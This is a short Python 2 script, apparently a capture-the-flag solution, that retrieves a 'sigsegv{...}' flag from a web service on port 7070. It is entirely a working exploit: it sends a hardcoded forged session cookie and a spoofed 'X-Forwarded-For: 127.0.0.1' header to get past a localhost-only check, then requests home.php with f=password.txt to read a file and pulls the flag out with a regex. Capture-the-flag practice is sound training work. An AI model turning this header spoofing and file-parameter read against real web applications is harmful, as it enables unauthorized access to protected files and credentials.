#!/usr/bin/env python2

import requests
import argparse
import re

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='host', type=str)

    args = parser.parse_args()

    headers = {'Cookie': 'hash=7B3AF9A4A9384637F7FA2D216DAE620B7134CB00CDD607B1E25C11B7C77E7FC8B6D3959572C61D03F0142B65EC719D2179A876DEEB6E56CA916F838D470D45FE',
        'X-Forwarded-For':'127.0.0.1'}
    url = 'http://{}:7070/home.php?f=password.txt'.format(args.host)

    r = requests.get(url, headers=headers)
    m = re.findall('(sigsegv\{[^\}]+\})', r.text)
    print(m[0])

if __name__ == "__main__":
    main()
